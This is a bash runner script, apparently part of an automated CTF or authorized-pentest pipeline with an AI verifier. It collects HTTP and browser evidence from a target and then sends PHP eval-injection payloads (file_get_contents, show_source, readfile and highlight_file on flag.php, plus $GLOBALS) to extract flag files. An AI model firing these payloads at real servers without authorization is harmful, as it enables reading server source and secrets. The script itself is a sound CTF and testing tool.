#!/usr/bin/env bash
set -euo pipefail

INPUT_PATH="${1:-/out/input.json}"
OUT_DIR="${2:-/out}"
RUNNER_NAME="${RUNNER_NAME:-hawkwing-runner}"

mkdir -p "${OUT_DIR}/evidence/http" "${OUT_DIR}/evidence/screenshots" "${OUT_DIR}/evidence/files" "${OUT_DIR}/evidence/forensics" "${OUT_DIR}/evidence/pcap"

TARGET="$(python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(d.get('target','unknown-target'))" "${INPUT_PATH}" 2>&1 || echo "unknown-target")"
JOB_ID="$(python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(d.get('job_id','unknown-job'))" "${INPUT_PATH}" 2>&1 || echo "unknown-job")"
FINDING_ID="$(python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(d.get('finding_id','unknown-finding'))" "${INPUT_PATH}" 2>&1 || echo "unknown-finding")"
AUTHORIZATION_JSON="$(python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(json.dumps(d.get('authorization', {}), ensure_ascii=False))" "${INPUT_PATH}" 2>/dev/null || echo "{}")"

cat > "${OUT_DIR}/authorization.json" <<JSON
${AUTHORIZATION_JSON}
JSON

{
  echo "runner=${RUNNER_NAME}"
  echo "job_id=${JOB_ID}"
  echo "finding_id=${FINDING_ID}"
  echo "target=${TARGET}"
  echo "authorization_scope=${HAWKWING_CTF_MODE:-authorized_target_only}"
  echo "authorized_target=${HAWKWING_AUTHORIZED_TARGET:-${TARGET}}"
  echo "tool_access=${HAWKWING_TOOL_ACCESS:-all_container_tools}"
  echo "started_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo "available_tools:"
  for tool in nmap naabu httpx subfinder nuclei ffuf katana tshark zeek suricata impacket-GetADUsers bloodhound-python volatility3 binwalk gdb r2 trivy; do
    if command -v "${tool}" >/dev/null 2>&1; then
      echo "  - ${tool}: $(command -v "${tool}")"
    fi
  done
} | tee "${OUT_DIR}/commands.log"

# === Browser rendering via Playwright ===
BROWSER_DIR="${OUT_DIR}/evidence/browser"
mkdir -p "${BROWSER_DIR}"

if [[ "${TARGET}" =~ ^https?:// ]]; then
  echo "browser_start=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "${OUT_DIR}/commands.log"
  python3 - "${TARGET}" "${BROWSER_DIR}" <<'PY' >> "${OUT_DIR}/commands.log" 2>&1 || true
import sys
from pathlib import Path

target = sys.argv[1]
out_dir = Path(sys.argv[2])

try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu"])
        page = browser.new_page()
        page.goto(target, wait_until="networkidle", timeout=30000)
        print(f"browser_title={page.title()}")
        shot = out_dir / "page.png"
        page.screenshot(path=str(shot), full_page=True)
        print(f"browser_screenshot={shot}")
        html = page.content()
        (out_dir / "page.html").write_text(html, encoding="utf-8")
        print(f"browser_html_saved={out_dir / 'page.html'} ({len(html)} bytes)")
        browser.close()
except Exception as exc:
    print(f"browser_error={exc}")
PY
  echo "browser_end=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "${OUT_DIR}/commands.log"
fi

# === HTTP collection (raw evidence gathering, no flag extraction) ===
if [[ "${TARGET}" =~ ^https?:// ]]; then
  HTTP_DIR="${OUT_DIR}/evidence/http"
  PATHS=("/" "/robots.txt" "/flag" "/flag.txt" "/readme.txt" "/.well-known/security.txt")
  for path in "${PATHS[@]}"; do
    url="${TARGET%/}${path}"
    safe_name="$(echo "${path}" | sed 's#[/.]#_#g; s#^_$#index#')"
    echo "fetch=${url}" | tee -a "${OUT_DIR}/commands.log"
    curl -k -L --connect-timeout 8 --max-time 20 -A "HawkWing-Runner/0.1" \
      -D "${HTTP_DIR}/${safe_name}.headers.txt" \
      -o "${HTTP_DIR}/${safe_name}.body.txt" \
      "${url}" >/dev/null 2>&1 || true
  done

  # === CTF web proof attempts ===
  # These requests stay inside the authorized target URL and are designed for
  # common challenge patterns such as PHP eval + local flag file reads.
  echo "ctf_probe_start=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "${OUT_DIR}/commands.log"
  python3 - "${TARGET}" "${HTTP_DIR}" <<'PY' >> "${OUT_DIR}/commands.log" 2>&1 || true
import json
import re
import sys
from pathlib import Path
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl
from urllib.request import Request, build_opener, ProxyHandler
from urllib.error import URLError, HTTPError

target = sys.argv[1]
http_dir = Path(sys.argv[2])
http_dir.mkdir(parents=True, exist_ok=True)

flag_re = re.compile(r"(?:flag|ctf|FLAG|CTF)\{[^}\r\n]{1,200}\}")
payloads = [
    ("hello_file_get_contents", {"hello": "file_get_contents('flag.php')"}),
    ("hello_show_source", {"hello": "show_source('flag.php')"}),
    ("hello_readfile", {"hello": "readfile('flag.php')"}),
    ("hello_highlight_file", {"hello": "highlight_file('flag.php')"}),
    ("hello_var_dump_flag", {"hello": "$flag"}),
    ("hello_globals", {"hello": "$GLOBALS"}),
]

opener = build_opener(ProxyHandler({}))


def with_query(url: str, params: dict[str, str]) -> str:
    parts = urlsplit(url)
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    query.update(params)
    return urlunsplit((parts.scheme, parts.netloc, parts.path or "/", urlencode(query), parts.fragment))


results = []
seen_flags = set()
for name, params in payloads:
    url = with_query(target, params)
    body = ""
    status = "error"
    error = ""
    try:
        req = Request(url, headers={"User-Agent": "HawkWing-Runner/0.1"})
        with opener.open(req, timeout=20) as response:
            status = str(response.status)
            body = response.read(200000).decode("utf-8", errors="replace")
    except HTTPError as exc:
        status = str(exc.code)
        body = exc.read(200000).decode("utf-8", errors="replace")
    except URLError as exc:
        error = str(exc)

    safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", name)
    (http_dir / f"proof_{safe}.body.txt").write_text(body, encoding="utf-8")
    (http_dir / f"proof_{safe}.meta.json").write_text(json.dumps({
        "name": name,
        "url": url,
        "status": status,
        "error": error,
        "body_file": f"proof_{safe}.body.txt",
    }, ensure_ascii=False, indent=2), encoding="utf-8")

    flags = []
    for match in flag_re.findall(body):
        if match not in seen_flags:
            seen_flags.add(match)
            flags.append(match)
    results.append({"name": name, "url": url, "status": status, "flags": flags, "error": error})
    print(f"ctf_probe={name} status={status} flags={flags} error={error}")

(http_dir / "proof-summary.json").write_text(json.dumps({
    "target": target,
    "attempts": results,
    "flag_candidates": [{"candidate": flag, "source": "ctf-proof-request"} for flag in sorted(seen_flags)],
}, ensure_ascii=False, indent=2), encoding="utf-8")
PY
  echo "ctf_probe_end=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "${OUT_DIR}/commands.log"
fi

# === Result: include any proof-derived flag candidates, Runner AI will verify ===
FLAG_CANDIDATES_JSON="$(python3 - "${OUT_DIR}/evidence/http/proof-summary.json" <<'PY'
import json
import sys
from pathlib import Path

path = Path(sys.argv[1])
if not path.exists():
    print("[]")
else:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        print(json.dumps(data.get("flag_candidates", []), ensure_ascii=False))
    except Exception:
        print("[]")
PY
)"

cat > "${OUT_DIR}/timeline.json" <<JSON
[
  {"event":"runner.started","runner":"${RUNNER_NAME}","target":"${TARGET}","time":"$(date -u +%Y-%m-%dT%H:%M:%SZ)"},
  {"event":"runner.collection.completed","runner":"${RUNNER_NAME}","target":"${TARGET}","time":"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}
]
JSON

cat > "${OUT_DIR}/result.json" <<JSON
{
  "status": "completed",
  "runner": "${RUNNER_NAME}",
  "confidence": 0.5,
  "impact": "manual_review_required",
  "privilege_obtained": "none",
  "flag_candidates": ${FLAG_CANDIDATES_JSON},
  "summary": "${RUNNER_NAME} collected evidence and attempted bounded CTF proof requests for ${TARGET}.",
  "evidence_files": [
    "commands.log",
    "timeline.json",
    "evidence/http",
    "evidence/browser"
  ],
  "recommendation": "Review proof-summary.json and proof_*.body.txt first. Runner AI should only report flags found in real evidence."
}
JSON

echo "completed_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "${OUT_DIR}/commands.log"
